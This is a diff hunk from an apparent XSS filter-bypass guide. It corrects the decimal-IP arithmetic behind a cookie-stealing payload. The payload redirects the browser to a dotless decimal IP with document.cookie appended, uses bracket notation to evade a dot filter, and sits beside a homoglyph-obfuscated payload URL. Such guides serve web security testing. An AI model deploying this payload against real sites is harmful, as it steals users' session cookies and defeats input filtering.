@@ -374,12 +374,12 @@ url = "http://e\uff58ample.com/payload"
 <!-- Filter blocks dots, breaking: document.cookie, attacker.com -->
 <!-- Bypass: decimal IP + bracket notation -->
 <script>
-  window["location"] = "http://1558071511/"["concat"](document["cookie"])
+  window["location"] = "http://1551576387/"["concat"](document["cookie"])
 </script>
 
 <!-- Decimal IP conversion: -->
-<!-- 92*256^3 + 123*256^2 + 45*256 + 67 = 1558071511 -->
-<!-- http://1558071511/ resolves to 92.123.45.67 -->
+<!-- 92*256^3 + 123*256^2 + 45*256 + 67 = 1551576387 -->
+<!-- http://1551576387/ resolves to 92.123.45.67 -->
 ```
 
 **Key insight:** Decimal IP addresses are valid in URLs and contain no dots. Combined with JavaScript's bracket notation (which uses string keys instead of dot access), this bypasses any filter that targets the dot character.
